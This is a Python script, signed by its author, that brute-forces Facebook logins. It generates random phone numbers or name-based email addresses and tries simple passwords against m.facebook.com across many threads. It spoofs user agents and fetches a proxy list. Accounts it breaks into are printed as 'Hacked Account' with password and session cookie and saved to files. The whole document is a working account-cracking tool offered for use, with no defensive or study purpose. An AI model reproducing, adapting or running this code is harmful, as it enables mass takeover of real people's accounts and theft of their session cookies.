#Sc Make By Asraful Islam Hasan
#Gift By Hasan
#Github= KgHasan

#_______Mudels______#
import os,sys,time,json,random,re,string,platform,base64,uuid,marshal
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______Coluar________#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#_______TimeDate_______#
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_________Proxy________#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
#________Logo__________#
logo = ("""
 HI GUYS I AM SC MAKER HASAN
 NEW SC NUMBAR UID+GMAIL CLONE
""")
#__________Sc Main_________#
class Ifty:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [1] Random Uid+Num Clone")
        print(" [2] Random Gmail Clone ")
        print(" [3] Contact Admin")
        print(" [0] Exit")
        Ornita =input(" [?] Choose : ")
        if Ornita in ["1", "01"]:
            asha()
        if Ornita in ["2","02"]:
            naima()
        if Ornita in [" 3", "03"]:
        	os.system('xdg-open https://www.facebook.com/copy.link.erorr404')
        if Ornita in [" 0", "00"]:
            exit()
        else:
            exit()
            
#_________Numbar Clone_______#
def asha():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    kode = input(' [?] Choice Sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    limit = int(input(' [?] Clone Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as raifa:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total id:\033[1;92m '+tl)
        print('[+] Save As /sdcard/hasan-ok.txt')
        print('[!] Save As /Sdacrd/hasan-cp.txt')
        print('[!] Use flight mode for speed up ')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            raifa.submit(sabina,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

#________Gamil Clone_______#
def naima():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    limit = int(input('[?] Clone Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as raifa:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total ids:\033[1;92m '+tl)
        print('[+] Save As /sdcard/hasan-ok.txt')
        print('[!] Save As /Sdacrd/hasan-cp.txt')
        print('[!] Use flight mode for speed up ')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            raifa.submit(sabina,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def sabina(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[HASAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #__________Mathoid_______#
            header_freefb = {'authority': 'x.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'referer': 'https://x.facebook.com/?stype=lo&jlou=Afcz3iuWYQvyCn13IwG6s9uw7NBWahX5zyffye58vmNBFgPmzje5fDUJ0irC83Njf6ernY_FxVg2VJux0n5KHxflHRFfInXCmjcSt7aCBnHaPw&smuh=17377&lh=Ac8zlEqqnHNW6wWrFmc&wtsid=rdr_074Z4qKJoOeyDlgKJ&_rdr',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                #_______Ok Id Print________#
                print('\n\033[1;94m_____________Hacked Account______________\033[1;92m')
                print(f"\033[1;92m[NUMBAR] =  {uid}")
                print(f"\033[1;92m[UID] = {cid}")
                print(f"\033[1;92m[PASSWORD] = {ps}")
                print(f"\033[1;92m[COOKIE] = {coki}")
                open('/sdcard/hasan-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #_________Cp Id Print________#
                print('\n\033[1;91m_____________Sorry Cp Account______________\033[1;95m')
                print(f"\033[1;95m[NUMBAR] =  {uid}")
                #print(f"[UID] = {ids}")
                print(f"\033[1;95m[PASSWORD] = {ps}")
                print(f'\033[1;95m[USAR AGENT] = '+pro+'\033[1;93m')
                open('/sdcard/hasan-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[HASAN] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Ifty()
#closed#